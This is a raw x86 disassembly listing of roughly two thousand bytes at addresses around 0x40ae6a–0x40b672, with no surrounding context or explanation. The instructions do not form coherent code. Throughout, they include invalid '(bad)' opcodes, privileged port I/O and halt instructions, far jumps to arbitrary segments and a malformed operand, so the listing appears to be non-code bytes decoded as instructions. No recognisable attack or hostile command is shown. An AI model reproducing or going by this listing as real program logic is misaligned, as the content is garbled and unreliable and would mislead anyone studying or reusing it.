  40ae6a:	add    eax,0x5696e745
  40ae6f:	push   eax
  40ae70:	mov    esi,0x6d55b8e3
  40ae75:	ins    BYTE PTR es:[edi],dx
  40ae76:	aas    
  40ae77:	sbb    bh,bl
  40ae79:	xor    al,0x2f
  40ae7b:	xchg   edx,eax
  40ae7c:	repz cdq 
  40ae7e:	mov    ah,0x32
  40ae80:	mov    ch,0x5f
  40ae82:	xor    al,0x74
  40ae84:	imul   DWORD PTR [ecx]
  40ae86:	dec    ebx
  40ae87:	push   0xfffffff1
  40ae89:	sub    ebp,0x8ee7fc0d
  40ae8f:	lock jns 0x5b7c7a3f
  40ae96:	mov    dl,0x23
  40ae98:	dec    ebx
  40ae99:	aas    
  40ae9a:	sbb    al,0x3d
  40ae9c:	loope  0x40ae99
  40ae9e:	repnz out 0x28,eax
  40aea1:	outs   dx,BYTE PTR ds:[esi]
  40aea2:	or     edx,DWORD PTR [edx+0x30]
  40aea5:	test   BYTE PTR [edx],0xd6
  40aea8:	cdq    
  40aea9:	loopne 0x40ae61
  40aeab:	lods   al,BYTE PTR ds:[esi]
  40aeac:	lock es (bad) 
  40aeaf:	ror    DWORD PTR [ebp+esi*4-0x23],cl
  40aeb3:	call   0x53da212f
  40aeb8:	(bad)  
  40aeb9:	dec    esi
  40aeba:	pop    eax
  40aebb:	repnz jmp 0xa828:0xbed54aaf
  40aec3:	pop    ebx
  40aec4:	enter  0x6f,0x2e
  40aec8:	push   edi
  40aec9:	xchg   BYTE PTR [edx],bh
  40aecb:	test   DWORD PTR [edi+0x5944a5e8],ecx
  40aed1:	jle    0x40ae9b
  40aed3:	and    eax,DWORD PTR [edx+ebx*1-0x4dc53ce4]
  40aeda:	or     BYTE PTR [ebx+0x4b],dl
  40aedd:	xor    eax,0xf04384fd
  40aee2:	push   ebx
  40aee3:	push   0x4f69ad54
  40aee8:	leave  
  40aee9:	dec    ebp
  40aeea:	sbb    al,0xef
  40aeec:	js     0x40aebd
  40aeee:	fstp   DWORD PTR [edx-0x20e21694]
  40aef4:	cmp    ebx,DWORD PTR [eax*8-0x6b17ce10]
  40aefb:	adc    al,0x99
  40aefd:	push   ebp
  40aefe:	icebp  
  40aeff:	or     eax,0xe9b356b0
  40af04:	into   
  40af05:	mov    ebp,0x7b8758d8
  40af0a:	xlat   BYTE PTR ds:[ebx]
  40af0b:	mov    dl,0xe0
  40af0d:	(bad)  
  40af0e:	dec    ebp
  40af0f:	jae    0x40af80
  40af11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af12:	mov    eax,ds:0x542fbfd6
  40af17:	aaa    
  40af18:	(bad)  
  40af19:	std    
  40af1a:	sub    bl,BYTE PTR [ecx-0x4eee45ac]
  40af20:	call   0xdb2a1ea2
  40af25:	or     eax,0xa2be2c8
  40af2a:	and    BYTE PTR [edi+0xe673f37],0x94
  40af31:	cmp    ah,al
  40af33:	push   ds
  40af34:	(bad)  
  40af35:	je     0x40aefa
  40af37:	lock mov al,0xcc
  40af3a:	dec    esi
  40af3b:	or     al,0x8e
  40af3d:	ror    ebx,0x84
  40af40:	inc    esi
  40af41:	(bad)  
  40af42:	pop    ds
  40af43:	push   esi
  40af44:	pushf  
  40af45:	cmp    ah,bh
  40af47:	pushf  
  40af48:	test   eax,0x6c4ae463
  40af4d:	add    ah,BYTE PTR [edx+0x59]
  40af50:	mov    esp,0x4f768d7c
  40af55:	add    eax,0xc534189b
  40af5a:	cmp    dh,BYTE PTR [edi+ebp*4]
  40af5d:	push   es
  40af5e:	mov    dl,0xc1
  40af60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af61:	inc    esp
  40af62:	xor    eax,0x3fa24d81
  40af67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af68:	push   es
  40af69:	sub    BYTE PTR [esi+0x5e6cfd51],0xef
  40af70:	mov    edx,0x155d9628
  40af75:	les    ebp,FWORD PTR [eax]
  40af77:	hlt    
  40af78:	test   eax,0x2f6e6261
  40af7d:	xor    al,0x48
  40af7f:	das    
  40af80:	add    al,0x46
  40af82:	sar    BYTE PTR [edx+eax*2-0x7284e1e9],cl
  40af89:	cs inc esp
  40af8b:	push   edx
  40af8c:	or     ebp,DWORD PTR [edx-0x3a5322f2]
  40af92:	pop    eax
  40af93:	lods   eax,DWORD PTR ds:[esi]
  40af94:	ds xchg ecx,eax
  40af96:	mov    dh,0x29
  40af98:	mov    eax,ds:0xde0f810d
  40af9d:	adc    DWORD PTR [ecx],ebp
  40af9f:	call   0x7a8388cd
  40afa4:	loopne 0x40af5a
  40afa6:	call   0x2de8d44f
  40afab:	mov    esi,0x293c6745
  40afb0:	or     dl,BYTE PTR [edi]
  40afb2:	ret    
  40afb3:	dec    ebx
  40afb4:	arpl   WORD PTR [ebx-0xa],bx
  40afb7:	mov    ebp,0xf4d78438
  40afbc:	das    
  40afbd:	retf   0x4bcd
  40afc0:	and    cl,BYTE PTR [ebx-0x1]
  40afc3:	jb     0x40afaf
  40afc5:	gs add bh,al
  40afc8:	jmp    0x28e2e2e9
  40afcd:	or     ch,ah
  40afcf:	dec    esi
  40afd0:	cmc    
  40afd1:	xor    ebx,edi
  40afd3:	xchg   ebp,eax
  40afd4:	and    al,0x36
  40afd6:	jmp    0x282a:0x18526a4b
  40afdd:	fdivr  QWORD PTR [esi]
  40afdf:	lds    edi,FWORD PTR [ebx]
  40afe1:	xchg   esi,eax
  40afe2:	std    
  40afe3:	jp     0x40af71
  40afe5:	test   al,0xee
  40afe7:	jno    0x40b046
  40afe9:	pminub mm5,QWORD PTR [esi-0x40]
  40afed:	push   0xffffffdd
  40afef:	(bad)  
  40aff1:	test   eax,0xbd5ff23e
  40aff6:	jb     0x40afd9
  40aff8:	data16 xor BYTE PTR [edx+0x45762609],dh
  40afff:	xor    ebp,ebx
  40b001:	test   ecx,ecx
  40b003:	fstp   QWORD PTR [edx]
  40b005:	dec    esi
  40b006:	xor    eax,0x18ef5da7
  40b00b:	xchg   edx,eax
  40b00c:	sbb    eax,0xdaca520b
  40b011:	cdq    
  40b012:	test   edx,eax
  40b014:	es push edx
  40b016:	sbb    BYTE PTR [edi-0x50],ch
  40b019:	dec    ecx
  40b01a:	pop    ds
  40b01b:	sub    dl,ch
  40b01d:	cmp    esp,DWORD PTR [esi]
  40b01f:	add    edi,eax
  40b021:	das    
  40b022:	lods   eax,DWORD PTR ds:[esi]
  40b023:	inc    esp
  40b024:	jns    0x40b016
  40b026:	scas   eax,DWORD PTR es:[edi]
  40b027:	jae    0x40b07d
  40b029:	or     edi,DWORD PTR [ebp+0x68]
  40b02c:	xchg   ebx,eax
  40b02d:	xchg   BYTE PTR ds:0xc09b25be,bh
  40b033:	popa   
  40b034:	repnz pop edx
  40b036:	add    al,0xde
  40b038:	test   DWORD PTR [esi+0x75],edx
  40b03b:	mov    eax,0x8a257a1b
  40b040:	and    eax,0x5b761e42
  40b045:	adc    al,0x10
  40b047:	xor    al,0x5a
  40b049:	(bad)  
  40b04b:	or     edx,edi
  40b04d:	(bad)  
  40b04e:	ins    BYTE PTR es:[edi],dx
  40b04f:	fldcw  WORD PTR cs:[eax]
  40b052:	lds    ebp,FWORD PTR [ebp-0x72]
  40b055:	int    0xe1
  40b057:	sbb    ah,BYTE PTR [eax]
  40b059:	xchg   esi,eax
  40b05a:	lock and eax,0x4ea34d9d
  40b060:	lock xor ebp,DWORD PTR [edi-0x5b]
  40b064:	test   cl,bh
  40b066:	repz xchg edi,eax
  40b068:	fmulp  st(2),st
  40b06a:	xor    BYTE PTR [esi+0x61],bh
  40b06d:	mov    ds:0x9b264401,al
  40b072:	ret    
  40b073:	cld    
  40b074:	adc    DWORD PTR ds:0xe50c33a2,ecx
  40b07a:	inc    edx
  40b07b:	xchg   esp,eax
  40b07c:	les    edi,FWORD PTR [ebp-0x17191fdf]
  40b082:	bound  eax,QWORD PTR [edx+0x14]
  40b085:	call   0xee72c465
  40b08a:	mov    dh,0x8
  40b08c:	xchg   edx,eax
  40b08d:	pop    ebx
  40b08e:	and    BYTE PTR [edx+0x3],cl
  40b091:	inc    edx
  40b092:	ins    BYTE PTR es:[edi],dx
  40b093:	xlat   BYTE PTR ds:[ebx]
  40b094:	push   ebp
  40b095:	outs   dx,BYTE PTR ds:[esi]
  40b096:	sbb    al,0xf0
  40b098:	daa    
  40b099:	sbb    eax,eax
  40b09b:	and    al,0x5c
  40b09d:	or     al,ch
  40b09f:	repnz imul BYTE PTR [ebx+0x63]
  40b0a3:	mov    ecx,DWORD PTR [eax-0x19]
  40b0a6:	and    BYTE PTR [ecx+0x6b85c74a],al
  40b0ac:	fs xchg esi,eax
  40b0ae:	in     al,dx
  40b0af:	fst    DWORD PTR [eax+0x6c]
  40b0b2:	call   0xb93b:0xce00fb10
  40b0b9:	adc    eax,0x3834d785
  40b0be:	adc    DWORD PTR [edi+ebx*1-0x7e],edx
  40b0c2:	sbb    BYTE PTR [ecx],al
  40b0c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0c5:	inc    ebp
  40b0c6:	scas   al,BYTE PTR es:[edi]
  40b0c7:	cmp    dl,BYTE PTR [ebp+0x19b52258]
  40b0cd:	sbb    al,0x70
  40b0cf:	repnz xor BYTE PTR [eax],cl
  40b0d2:	cmp    DWORD PTR [ebp-0x36c8b5b1],ecx
  40b0d8:	add    al,0x7a
  40b0da:	sbb    BYTE PTR [esi-0x72433592],dl
  40b0e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0e1:	push   esi
  40b0e2:	or     bh,bh
  40b0e4:	xchg   ebx,eax
  40b0e5:	cmp    al,0x58
  40b0e7:	gs adc al,0x85
  40b0ea:	lods   eax,DWORD PTR ds:[esi]
  40b0eb:	xor    edi,DWORD PTR [ebp-0x57806c0c]
  40b0f1:	or     edx,DWORD PTR fs:0x344c18e1
  40b0f8:	lea    edx,[edi-0x19773a53]
  40b0fe:	jmp    0xc287ccbb
  40b103:	sub    BYTE PTR [esi-0x3a],dl
  40b106:	aam    0xef
  40b108:	mov    al,ds:0x3c96747
  40b10d:	sub    BYTE PTR [eax+0x14f402aa],0x88
  40b114:	sub    ah,BYTE PTR [ebp+0x1fec1cb5]
  40b11a:	pop    eax
  40b11b:	push   0x73
  40b11d:	ret    
  40b11e:	pushf  
  40b11f:	add    eax,DWORD PTR [ecx-0x25]
  40b122:	test   BYTE PTR [eax+0x805177a],bl
  40b128:	icebp  
  40b129:	cmp    ebp,ecx
  40b12b:	test   edx,0x7a8260e7
  40b131:	jne    0x40b112
  40b133:	push   0x903ad0ea
  40b138:	idiv   DWORD PTR [edi-0x44]
  40b13b:	ret    
  40b13c:	jmp    0x40b193
  40b13e:	and    al,BYTE PTR [ecx-0x7f1a38a6]
  40b144:	loopne 0x40b1bd
  40b146:	push   ds
  40b147:	leave  
  40b148:	fadd   DWORD PTR [ecx+0x5faf3a85]
  40b14e:	loop   0x40b17d
  40b150:	sbb    BYTE PTR [esi+eiz*1+0x3cd5314],dh
  40b157:	mov    ecx,0x57b79f7d
  40b15c:	mov    ah,0x69
  40b15e:	cmp    al,0xb8
  40b160:	sbb    edi,ebx
  40b162:	jnp    0x40b100
  40b164:	xor    al,0xa8
  40b166:	mov    al,ds:0x6953a1ab
  40b16b:	outs   dx,DWORD PTR ds:[esi]
  40b16c:	aas    
  40b16d:	std    
  40b16e:	pop    ecx
  40b16f:	or     eax,0xb882465f
  40b174:	hlt    
  40b175:	dec    ebp
  40b176:	adc    DWORD PTR [eax+0x11],ebp
  40b179:	stc    
  40b17a:	nop
  40b17b:	fist   DWORD PTR [esi+0x4c]
  40b17e:	ins    BYTE PTR es:[edi],dx
  40b17f:	xchg   edx,eax
  40b180:	push   0xffffffd6
  40b182:	pop    ebx
  40b183:	fadd   DWORD PTR [esi]
  40b185:	adc    DWORD PTR [edx+edx*2-0x31],esi
  40b189:	sub    eax,0x910eb071
  40b18e:	sub    eax,0x37
  40b191:	scas   eax,DWORD PTR es:[edi]
  40b192:	inc    ecx
  40b193:	pop    ds
  40b194:	and    edx,ecx
  40b196:	adc    eax,0x318cc484
  40b19b:	mov    ebx,DWORD PTR [esi-0x64]
  40b19e:	inc    esi
  40b19f:	sti    
  40b1a0:	rol    DWORD PTR [edx],0xca
  40b1a3:	ficomp WORD PTR [ebx]
  40b1a5:	retf   0xed67
  40b1a8:	mov    esp,0xf6f53d96
  40b1ad:	mov    ebx,0x5da49182
  40b1b2:	xor    dl,BYTE PTR [eax]
  40b1b4:	mov    ah,0xfe
  40b1b6:	dec    ecx
  40b1b7:	dec    edi
  40b1b8:	mov    edx,0xc05834b7
  40b1bd:	pop    edx
  40b1be:	gs test al,0x3a
  40b1c1:	pop    esp
  40b1c2:	dec    ebp
  40b1c3:	inc    ecx
  40b1c4:	in     eax,0x48
  40b1c6:	outs   dx,DWORD PTR ds:[esi]
  40b1c7:	in     al,dx
  40b1c8:	sbb    DWORD PTR [esi-0x4a],edi
  40b1cb:	mov    DWORD PTR [eax-0x6b],0x161595d6
  40b1d2:	adc    al,0x48
  40b1d4:	addr16 pushf 
  40b1d6:	stc    
  40b1d7:	xchg   ebx,eax
  40b1d8:	(bad)  
  40b1da:	and    DWORD PTR [edi+0x5312336b],edx
  40b1e0:	hlt    
  40b1e1:	clc    
  40b1e2:	scas   al,BYTE PTR es:[edi]
  40b1e3:	fcom   DWORD PTR [ebx+0x48d290b0]
  40b1e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1ea:	in     al,0xe3
  40b1ec:	dec    ebp
  40b1ed:	xor    eax,ecx
  40b1ef:	add    eax,0xd4cc091e
  40b1f4:	sbb    eax,0xc377059f
  40b1f9:	jmp    0xcb336501
  40b1fe:	and    eax,0xa5c4db5f
  40b203:	or     al,0xd5
  40b205:	xor    DWORD PTR [eax],ebx
  40b207:	std    
  40b208:	loop   0x40b216
  40b20a:	xor    eax,0x38b6e4fd
  40b20f:	mov    eax,0xa3397c58
  40b214:	lock inc ebx
  40b216:	mov    esi,0x6144b7f7
  40b21b:	jp     0x40b277
  40b21d:	jl     0x40b203
  40b21f:	sbb    al,0xce
  40b221:	pop    edi
  40b222:	lock adc cl,BYTE PTR [esi-0x5]
  40b226:	and    edi,DWORD PTR [ecx-0x34fd6298]
  40b22c:	arpl   sp,bx
  40b22e:	cmp    al,0x35
  40b230:	sti    
  40b231:	es mov ch,dl
  40b234:	xor    eax,0xcaa2bb5f
  40b239:	mov    eax,ds:0xc636e226
  40b23e:	cmp    edx,ecx
  40b240:	int    0x93
  40b242:	add    ebx,DWORD PTR [eax-0x3e]
  40b245:	pop    ebx
  40b246:	fst    st(1)
  40b248:	xchg   esi,eax
  40b249:	mov    cl,0x68
  40b24b:	(bad)  
  40b24c:	aam    0x9c
  40b24e:	mov    dh,0x78
  40b250:	(bad)  
  40b251:	mov    eax,ds:0xc3a1f31d
  40b256:	popf   
  40b257:	cmp    BYTE PTR [eax],ah
  40b259:	por    mm3,mm2
  40b25c:	jne    0x40b242
  40b25e:	fsub   DWORD PTR gs:[edi]
  40b261:	aaa    
  40b262:	mov    eax,ds:0xc38678b7
  40b267:	cmp    eax,0x31f0586b
  40b26c:	xor    eax,0xe18df5fe
  40b271:	lods   eax,DWORD PTR ds:[esi]
  40b272:	shl    DWORD PTR [edi],cl
  40b274:	mov    esi,DWORD PTR [edi+edi*2-0x4fe98184]
  40b27b:	mov    eax,0xfa912bc8
  40b280:	or     DWORD PTR [ebp+0x62],eax
  40b283:	adc    al,dl
  40b285:	sub    DWORD PTR [ecx+0x1],ebx
  40b288:	outs   dx,BYTE PTR ds:[esi]
  40b289:	je     0x40b28b
  40b28b:	xchg   ebp,eax
  40b28c:	(bad)  
  40b28e:	jg     0x40b2b7
  40b290:	inc    edx
  40b291:	add    eax,esi
  40b293:	pop    ds
  40b294:	jns    0x40b29c
  40b296:	fs adc eax,0x5cc363d3
  40b29c:	in     al,0x45
  40b29e:	mov    ebx,0x912c018f
  40b2a3:	mov    ds:0x34b9be54,eax
  40b2a8:	dec    ebp
  40b2a9:	add    BYTE PTR [esp+esi*2],bl
  40b2ac:	dec    edx
  40b2ad:	cmp    dl,bh
  40b2af:	fsubrp st(6),st
  40b2b1:	(bad)  
  40b2b2:	out    0x0,al
  40b2b4:	dec    esi
  40b2b5:	dec    ebp
  40b2b6:	nop
  40b2b7:	loop   0x40b275
  40b2b9:	sub    al,0xd0
  40b2bb:	jae    0x40b29f
  40b2bd:	out    dx,eax
  40b2be:	dec    esi
  40b2bf:	xchg   ebp,eax
  40b2c0:	xlat   BYTE PTR ds:[ebx]
  40b2c1:	shr    BYTE PTR [eax+ecx*4+0x5a],0x83
  40b2c6:	sbb    DWORD PTR [esi],esi
  40b2c8:	(bad)  
  40b2c9:	or     al,0x42
  40b2cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2cc:	pop    edx
  40b2cd:	leave  
  40b2ce:	pop    ebx
  40b2cf:	mov    bl,0xd9
  40b2d1:	and    DWORD PTR [ecx-0x15f98f1c],edi
  40b2d7:	push   ss
  40b2d8:	dec    ecx
  40b2d9:	in     al,0xeb
  40b2db:	dec    ebx
  40b2dc:	jae    0x40b2d0
  40b2de:	mov    BYTE PTR [edi],dl
  40b2e0:	mov    esi,0xfa194dbd
  40b2e5:	loopne 0x40b315
  40b2e7:	shr    cl,1
  40b2e9:	push   0xd305ee95
  40b2ee:	jae    0x40b2f7
  40b2f0:	push   es
  40b2f1:	push   ecx
  40b2f2:	mov    ebx,0x14e1f49c
  40b2f7:	xor    al,0x6
  40b2f9:	div    DWORD PTR [ebx+0x71]
  40b2fc:	in     eax,0x3d
  40b2fe:	inc    ebp
  40b2ff:	pop    edi
  40b300:	xchg   esp,eax
  40b301:	or     al,cl
  40b303:	mov    bl,0x89
  40b305:	pop    esi
  40b306:	bound  esi,QWORD PTR [edi+0x26de9853]
  40b30c:	and    eax,0x32cd6f06
  40b311:	aad    0x38
  40b313:	sbb    al,0xbd
  40b315:	pop    eax
  40b316:	icebp  
  40b317:	hlt    
  40b318:	mov    al,ds:0xf712c457
  40b31d:	mov    eax,ds:0xb2517a4a
  40b322:	ja     0x40b37c
  40b324:	xor    eax,0x1b9948a3
  40b329:	(bad)  [ecx]
  40b32b:	ror    bh,1
  40b32d:	xchg   edi,eax
  40b32e:	xchg   esp,eax
  40b32f:	push   ecx
  40b330:	sbb    al,0xaf
  40b332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b333:	test   DWORD PTR [ebp+0x11],ebp
  40b336:	je     0x40b361
  40b338:	gs push 0x6d9a99ac
  40b33e:	add    edx,0x34
  40b341:	loop   0x40b35d
  40b343:	dec    esi
  40b344:	nop
  40b345:	std    
  40b346:	mov    BYTE PTR [edx-0x47],0x7b
  40b34a:	out    0x12,al
  40b34c:	adc    BYTE PTR [ebp+0x6f7d0148],cl
  40b352:	cmp    ah,BYTE PTR [ebx]
  40b354:	stc    
  40b355:	pop    esp
  40b356:	loope  0x40b35f
  40b358:	push   es
  40b359:	sahf   
  40b35a:	jae    0x40b378
  40b35c:	dec    ebp
  40b35d:	data16 ficomp WORD PTR [esi]
  40b360:	cwde   
  40b361:	sbb    eax,0x77ff8565
  40b366:	pusha  
  40b367:	imul   eax,DWORD PTR [esi+ebx*2],0x83aa9826
  40b36e:	jle    0x40b32e
  40b370:	sti    
  40b371:	mov    ecx,0x9cf53e69
  40b376:	stos   BYTE PTR es:[edi],al
  40b377:	push   ss
  40b378:	xchg   esi,eax
  40b379:	cmp    cl,BYTE PTR [edi+0x2616751d]
  40b37f:	clc    
  40b380:	out    dx,eax
  40b381:	pop    esi
  40b382:	adc    bl,dh
  40b384:	cdq    
  40b385:	xchg   edx,eax
  40b386:	mov    ebx,0xb508dc97
  40b38b:	xlat   BYTE PTR ds:[ebx]
  40b38c:	outs   dx,BYTE PTR ds:[esi]
  40b38d:	mov    esp,0x17686986
  40b392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b393:	jae    0x40b3e8
  40b395:	mov    WORD PTR [edx-0x2],fs
  40b398:	cmp    eax,0x8e69a379
  40b39d:	mov    ebp,0xabd3b9bb
  40b3a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3a3:	jmp    0xcbd0:0xafc33141
  40b3aa:	call   0x950b:0x9c127b4
  40b3b1:	arpl   WORD PTR [edi+0xd8cd622],si
  40b3b7:	aas    
  40b3b8:	xchg   esp,eax
  40b3b9:	jecxz  0x40b3ca
  40b3bb:	lock and BYTE PTR [ecx],dh
  40b3be:	dec    ebx
  40b3bf:	xchg   ecx,eax
  40b3c0:	into   
  40b3c1:	xchg   edi,esi
  40b3c3:	(bad)  
  40b3c4:	retf   
  40b3c5:	adc    dh,bl
  40b3c7:	mov    bl,ah
  40b3c9:	cdq    
  40b3ca:	mov    al,0x51
  40b3cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3cd:	inc    edx
  40b3ce:	in     al,dx
  40b3cf:	cmp    DWORD PTR [ebx],ebp
  40b3d1:	mov    esi,0xea7b790d
  40b3d6:	mov    dh,0x45
  40b3d8:	ja     0x40b379
  40b3da:	and    DWORD PTR [esi],edx
  40b3dc:	mov    ch,cl
  40b3de:	inc    eax
  40b3df:	jge    0x40b455
  40b3e1:	and    BYTE PTR fs:[edi+0x52],0x73
  40b3e6:	mov    ebp,0x9f133250
  40b3eb:	aad    0x98
  40b3ed:	jo     0x40b426
  40b3ef:	je     0x40b3c4
  40b3f1:	js     0x40b43a
  40b3f3:	bound  ebx,QWORD PTR [edx+0x147fd76f]
  40b3f9:	jp     0x40b38b
  40b3fb:	or     DWORD PTR [esi-0x38],edx
  40b3fe:	fld    st(5)
  40b400:	add    edx,DWORD PTR [edi+0xe]
  40b403:	push   ss
  40b404:	dec    ebp
  40b405:	fs (bad) 
  40b407:	cmp    bl,ch
  40b409:	mov    dh,0x5b
  40b40b:	popf   
  40b40c:	adc    al,0x5
  40b40e:	imul   eax,DWORD PTR [ebx+0x76],0x22feb841
  40b415:	test   eax,0xb78e1616
  40b41a:	cdq    
  40b41b:	fcompp 
  40b41d:	mov    ch,0x9f
  40b41f:	js     0x40b448
  40b421:	pop    ds
  40b422:	(bad)  
  40b423:	call   esp
  40b425:	jge    0x40b420
  40b427:	imul   BYTE PTR [edx]
  40b429:	adc    BYTE PTR [edi],bh
  40b42b:	adc    edi,DWORD PTR [ebp-0x5d]
  40b42e:	push   ecx
  40b42f:	jge    0x40b4ab
  40b431:	and    al,BYTE PTR [eax+0x381c4872]
  40b437:	cmp    ch,BYTE PTR [ebx+0x58]
  40b43a:	shl    BYTE PTR [ebp-0x1c],cl
  40b43d:	push   0xffffffea
  40b43f:	lahf   
  40b440:	mov    ds:0x745f072c,al
  40b445:	ss lahf 
  40b447:	pop    ebp
  40b448:	push   esp
  40b449:	or     eax,ebx
  40b44b:	sahf   
  40b44c:	lahf   
  40b44d:	in     eax,0xe0
  40b44f:	push   edi
  40b450:	sub    dh,BYTE PTR [edi]
  40b452:	mov    ?,ecx
  40b454:	sti    
  40b455:	mov    ecx,0x28dc732c
  40b45a:	inc    esp
  40b45b:	lds    ebx,FWORD PTR [edx+0x6f]
  40b45e:	jp     0x40b4ae
  40b460:	test   DWORD PTR [edx+0x46],ecx
  40b463:	sub    BYTE PTR [edx],ah
  40b465:	mov    dh,0x14
  40b467:	scas   al,BYTE PTR es:[edi]
  40b468:	mov    ds:0x2f1995d6,eax
  40b46d:	test   eax,0xb59b5528
  40b472:	inc    ecx
  40b473:	adc    ebx,ebx
  40b475:	lods   eax,DWORD PTR ds:[esi]
  40b476:	jno    0x40b450
  40b478:	or     bl,cl
  40b47a:	(bad)  
  40b47b:	sub    BYTE PTR [ebx-0x5e0390a4],al
  40b481:	scas   al,BYTE PTR es:[edi]
  40b482:	sub    DWORD PTR ds:0x1fbe5c76,0x98d58172
  40b48c:	and    eax,DWORD PTR [edx+0x1f]
  40b48f:	das    
  40b490:	jno    0x40b501
  40b492:	jo     0x40b4d6
  40b494:	inc    eax
  40b495:	push   esp
  40b496:	std    
  40b497:	pushf  
	...
  40b514:	out    0x10,eax
  40b516:	jge    0x40b4f1
  40b518:	(bad)  
  40b519:	std    
  40b51a:	out    0x3e,eax
  40b51c:	lods   eax,DWORD PTR ds:[esi]
  40b51d:	add    dh,ah
  40b51f:	shl    DWORD PTR [esi+0x2f],cl
  40b522:	cmp    eax,0x662dee
  40b527:	add    BYTE PTR [edi+eax*1+0x0],ch
  40b52b:	add    dl,ch
  40b52d:	and    eax,0x6c171a1f
  40b532:	jne    0x40b5ad
  40b534:	(bad)  
  40b535:	out    dx,eax
  40b536:	dec    edx
  40b537:	popf   
  40b538:	cmp    edi,eax
  40b53a:	test   DWORD PTR ds:0x6fc66528,esp
  40b540:	out    dx,eax
  40b541:	out    dx,eax
  40b542:	push   edx
  40b543:	out    dx,al
  40b544:	or     dh,bh
  40b546:	sub    eax,0x66968fb0
  40b54b:	std    
  40b54c:	pop    edx
  40b54d:	mov    BYTE PTR [ebp-0x20],0xfb
  40b551:	loop   0x40b4ef
  40b553:	mov    ss,WORD PTR [edi]
  40b555:	inc    ecx
  40b556:	js     0x40b4ed
  40b558:	adc    DWORD PTR [eax],eax
  40b55a:	and    al,0xbb
  40b55c:	sbb    BYTE PTR [esi-0x26],0xce
  40b560:	cmc    
  40b561:	mov    dh,0xa2
  40b563:	test   al,0xb1
  40b565:	cmc    
  40b566:	scas   al,BYTE PTR es:[edi]
  40b567:	xchg   edx,eax
  40b568:	pop    edi
  40b569:	push   0x0
  40b56b:	stos   BYTE PTR es:[edi],al
  40b56c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b56d:	mov    ecx,0xf7a3b5b
  40b572:	in     al,dx
  40b573:	adc    ch,al
  40b575:	ins    DWORD PTR es:[edi],dx
  40b576:	in     eax,0x6c
  40b578:	bound  esp,QWORD PTR [edx+0x7ed8293]
  40b57e:	retf   
  40b57f:	fadd   DWORD PTR [edi-0x323578d5]
  40b585:	fimul  WORD PTR [ebx-0x641b0e3e]
  40b58b:	mov    ecx,0x21cfb2f8
  40b590:	aaa    
  40b591:	(bad)  
  40b592:	cs and al,0x97
  40b595:	inc    ebp
  40b596:	inc    ebx
  40b597:	pop    ss
  40b598:	mov    WORD PTR [edx+eax*1+0x7f],es
  40b59c:	call   0x4997:0x9c0ac300
  40b5a3:	adc    eax,0x5b7ad0f2
  40b5a8:	pop    esp
  40b5a9:	jg     0x40b55f
  40b5ab:	adc    eax,0x9b01df94
  40b5b0:	jl     0x40b5e8
  40b5b2:	push   esi
  40b5b3:	pusha  
  40b5b4:	aaa    
  40b5b5:	add    eax,DWORD PTR [esi]
  40b5b7:	ror    BYTE PTR [edx+0x46],1
  40b5ba:	sub    bh,bh
  40b5bc:	fldpi  
  40b5be:	gs jp  0x40b5cb
  40b5c1:	arpl   WORD PTR [edx],cx
  40b5c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5c4:	sub    eax,0x30f825f8
  40b5c9:	sti    
  40b5ca:	daa    
  40b5cb:	out    0x4,eax
  40b5cd:	test   eax,0x3a8645eb
  40b5d2:	mov    ah,0x37
  40b5d4:	ins    BYTE PTR es:[edi],dx
  40b5d5:	sbb    ah,BYTE PTR [eax+edx*2+0x12]
  40b5d9:	push   0xc15b869
  40b5de:	or     al,0xd6
  40b5e0:	push   ebp
  40b5e1:	shl    BYTE PTR [ebp-0x3e],1
  40b5e4:	inc    eax
  40b5e5:	pop    ss
  40b5e6:	mov    BYTE PTR [edx-0x38],ah
  40b5e9:	and    eax,0x87c9d348
  40b5ee:	sbb    dh,BYTE PTR [ebp-0x56]
  40b5f1:	ds and eax,0x897cc268
  40b5f7:	jo     0x40b678
  40b5f9:	enter  0xd07,0xbd
  40b5fd:	neg    BYTE PTR [ecx+0x56]
  40b600:	test   BYTE PTR [ebp-0xbfbef00],bh
  40b606:	cwde   
  40b607:	pop    ss
  40b608:	hlt    
  40b609:	sbb    eax,0x4ae7ae39
  40b60e:	addr16 in al,dx
  40b610:	mov    cl,0xfb
  40b612:	fsubr  QWORD PTR [ebp+0x36cb5aef]
  40b618:	mov    ds:0xbf11552a,al
  40b61d:	ja     0x40b614
  40b61f:	xchg   ecx,eax
  40b620:	out    dx,eax
  40b621:	mov    ah,0x8b
  40b623:	aas    
  40b624:	out    0x15,al
  40b626:	and    BYTE PTR [ebp-0x3f],al
  40b629:	rol    ebp,1
  40b62b:	fwait
  40b62c:	outs   dx,BYTE PTR ds:[esi]
  40b62d:	add    eax,0x5af2185
  40b632:	mov    ah,0x1
  40b634:	outs   dx,DWORD PTR ds:[esi]
  40b635:	xchg   bh,bl
  40b637:	inc    edi
  40b638:	fidiv  DWORD PTR [eax+0x56df833a]
  40b63e:	mov    ebp,0xf6a24f9
  40b643:	and    al,0xe9
  40b645:	xchg   ebx,eax
  40b646:	push   ebx
  40b647:	stos   DWORD PTR es:[edi],eax
  40b648:	mov    edi,0xfe8e729c
  40b64d:	call   0x1f5da75f
  40b652:	(bad)  
  40b653:	cmc    
  40b654:	inc    ebp
  40b655:	adc    BYTE PTR [ebx],ah
  40b657:	add    edi,DWORD PTR [edi]
  40b659:	fs dec esp
  40b65b:	fisub  DWORD PTR [ecx+0x2f0c75ba]
  40b661:	push   ebx
  40b662:	pop    edx
  40b663:	in     eax,dx
  40b664:	loopne 0x40b600
  40b666:	retf   0xbe02
  40b669:	(bad)  
  40b66a:	fcmovnbe st,st(0)
  40b66c:	sbb    al,0xa7
  40b66e:	hlt    
  40b66f:	mov    ch,0xbe
  40b671:	iret   
  40b672:	jnp    0x40b64e
